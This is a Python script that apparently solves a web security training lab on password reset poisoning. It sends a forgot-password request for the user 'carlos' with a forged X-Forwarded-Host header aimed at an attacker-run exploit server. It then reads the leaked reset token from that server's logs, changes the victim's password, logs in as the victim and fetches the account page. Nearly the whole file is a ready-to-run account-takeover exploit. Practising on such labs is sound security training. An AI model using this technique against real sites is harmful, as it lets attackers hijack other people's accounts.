##############################################################
#
# Lab: Password reset poisoning via middleware
#
# Hack Steps: 
#      1. Make forgot-password request as carlos with 
#         the X-Forwarded-Host changed
#      2. Extract the token from the server logs
#      3. Change carlos password with the obtained token
#      4. Login as carlos with the new password
#      5. Fetch carlos profile
#
##############################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a0f0058042aa57c80a36ccd0073006c.web-security-academy.net"

# Change this to your exploit server DOMAIN
EXPLOIT_SERVER_DOMAIN = "exploit-0a9d00c90443a52980bc6b1001f100d5.exploit-server.net"

NEW_CARLOS_PASSWORD = "Hacked" # You can change this to what you want

def main():
    print("⦗1⦘ Making forgot-password request as carlos with the X-Forwarded-Host changed.. ", end="", flush=True)
    
    making_forgot_password_request_as_carlos()  

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the token from the server logs.. ", end="", flush=True)

    log_page = fetch_server_logs()
    token = get_token_from_logs(log_page)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Changing carlos password with the obtained token.. ", end="", flush=True)

    change_carlos_password(token)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Password was changed to " + Fore.GREEN + NEW_CARLOS_PASSWORD)
    print(Fore.WHITE + "⦗4⦘ Logging in as carlos with the new password.. ", end="", flush=True)

    data = { "username": "carlos", "password": NEW_CARLOS_PASSWORD }
    login_as_carlos = post_data("/login", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Fetching carlos profile.. ", end="", flush=True)

    session = login_as_carlos.cookies.get("session")
    cookies = { "session": session }
    fetch("/my-account", cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def making_forgot_password_request_as_carlos():
    data = { "username": "carlos" }
    headers = { "X-Forwarded-Host": EXPLOIT_SERVER_DOMAIN }
    post_data("/forgot-password", data, headers)

    
def fetch_server_logs():
    try:  
        return requests.get(f"https://{EXPLOIT_SERVER_DOMAIN}/log")
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch server logs through exception")
        exit(1)


def get_token_from_logs(log_page):
    token = re.findall("temp-forgot-password-token=(.*) HTTP", log_page.text)
    if len(token) != 0:
        return token[len(token)-1] # last token in the logs    
    else:
        print(Fore.RED + "⦗!⦘ No tokens are found is the logs")
        exit(1)

def change_carlos_password(token):
    data = {
        "temp-forgot-password-token": token,
        "new-password-1": NEW_CARLOS_PASSWORD,
        "new-password-2": NEW_CARLOS_PASSWORD,
    }
    post_data("/forgot-password", data)


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, headers = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()


